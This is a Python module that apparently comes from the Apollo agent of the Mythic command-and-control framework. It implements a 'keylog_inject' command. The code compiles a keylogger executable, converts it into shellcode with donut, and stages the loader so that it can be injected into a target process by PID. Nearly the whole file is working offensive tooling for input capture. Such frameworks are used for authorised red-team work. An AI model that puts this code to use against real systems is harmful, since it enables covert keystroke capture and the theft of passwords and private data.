from distutils.dir_util import copy_tree
import os
import shutil
import tempfile
from mythic_container.MythicCommandBase import *
import json
from uuid import uuid4
from os import path
from apollo.mythic.sRDI import ShellcodeRDI
from mythic_container.MythicRPC import *
import base64
import os
import asyncio

KEYLOG_INJECT_PATH = "/srv/KeyLogInject.exe"

class KeylogInjectArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="pid",
                cli_name="PID",
                display_name="PID",
                type=ParameterType.Number,
                description="Process ID to inject keylogger into."),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("Invalid number of parameters passed.\n\tUsage: {}".format(KeylogInjectCommand.help_cmd))
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            self.add_arg("pid", self.command_line.strip(), ParameterType.Number)
        self.add_arg("pipe_name", str(uuid4()))


class KeylogInjectCommand(CommandBase):
    cmd = "keylog_inject"
    needs_admin = False
    help_cmd = "keylog_inject [pid]"
    description = "Start a keylogger in a remote process."
    version = 2
    author = "@djhohnstein"
    argument_class = KeylogInjectArguments
    attackmapping = ["T1056"]
    supported_ui_features=["keylog_inject"]

    async def build_keyloginject(self):
        global KEYLOG_INJECT_PATH
        agent_build_path = tempfile.TemporaryDirectory()            
        outputPath = "{}/KeylogInject/bin/Release/KeylogInject.exe".format(agent_build_path.name)
            # shutil to copy payload files over
        copy_tree(str(self.agent_code_path), agent_build_path.name)
        shell_cmd = "dotnet build -c release -p:Platform=x64 {}/KeylogInject/KeylogInject.csproj -o {}/KeylogInject/bin/Release/".format(agent_build_path.name, agent_build_path.name)
        proc = await asyncio.create_subprocess_shell(shell_cmd, stdout=asyncio.subprocess.PIPE,
                                                         stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
        stdout, stderr = await proc.communicate()
        if not path.exists(outputPath):
            raise Exception("Failed to build KeylogInject.exe:\n{}".format(stderr.decode() + "\n" + stdout.decode()))
        shutil.copy(outputPath, KEYLOG_INJECT_PATH)


    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        global KEYLOG_INJECT_PATH
        if not path.exists(KEYLOG_INJECT_PATH):
            await self.build_keyloginject()
            
        donutPath = os.path.abspath(self.agent_code_path / "donut")
        if not path.exists(donutPath):
            raise Exception("Could not find {}".format(donutPath))
        command = "chmod 777 {}; chmod +x {}".format(donutPath, donutPath)
        proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr= asyncio.subprocess.PIPE)
        stdout, stderr = await proc.communicate()
        
        command = "{} -f 1 -p \"{}\" {}".format(donutPath, taskData.args.get_arg("pipe_name"), KEYLOG_INJECT_PATH)
        # need to go through one more step to turn our exe into shellcode
        proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE,
                                        stderr=asyncio.subprocess.PIPE, cwd="/tmp/")
        stdout, stderr = await proc.communicate()
        if os.path.exists("/tmp/loader.bin"):
            file_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
                TaskID=taskData.Task.ID,
                DeleteAfterFetch=True,
                FileContents=open("/tmp/loader.bin", 'rb').read()
            ))
            if file_resp.Success:
                taskData.args.add_arg("loader_stub_id", file_resp.AgentFileId)
            else:
                raise Exception("Failed to register keylog assembly: " + file_resp.Error)
        else:
            raise Exception("Failed to find loader.bin")
        response.DisplayParams = "-PID {}".format(taskData.args.get_arg("pid"))
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
